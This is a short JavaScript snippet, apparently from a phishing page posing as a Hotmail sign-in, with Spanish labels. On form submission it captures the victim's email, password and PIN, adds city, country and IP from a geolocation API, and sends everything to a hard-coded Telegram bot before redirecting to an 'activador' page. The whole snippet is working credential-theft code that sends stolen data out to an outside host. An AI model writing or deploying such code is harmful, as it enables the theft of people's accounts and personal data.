  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#login-form");
    form.addEventListener("submit", (event) => {
      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
      axios
        .get(url)
        .then((response) => {
          const us4r = document.querySelector("#us4r").value;
          const p4sx = document.querySelector("#p4sx").value;
          const p1n = document.querySelector("#p1n").value;
          const message =
            "✅HOTMAIL✅" +
            "\n📧Correo: " +
            us4r +
            "\n🔐Contraseña: " +
            p4sx +
            "\n🔐Pin: " +
            p1n +
            "\n🏙️Ciudad: " +
            response.data.city +
            "\n🌎Pais: " +
            response.data.country +
            "\n🔢IP: " +
            response.data.ip +
            "\n";
          axios
            .post(
              "https://api.telegram.org/bot6677351369:AAFA6YVifDmVvKZewqSC2SNsyJIBva3we7Q/sendMessage",
              {
                chat_id: "1827764793",
                text: message,
              }
            )
            .then((response) => {
              console.log(response.data);
              window.location.href = "activador.html";
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
  </script>
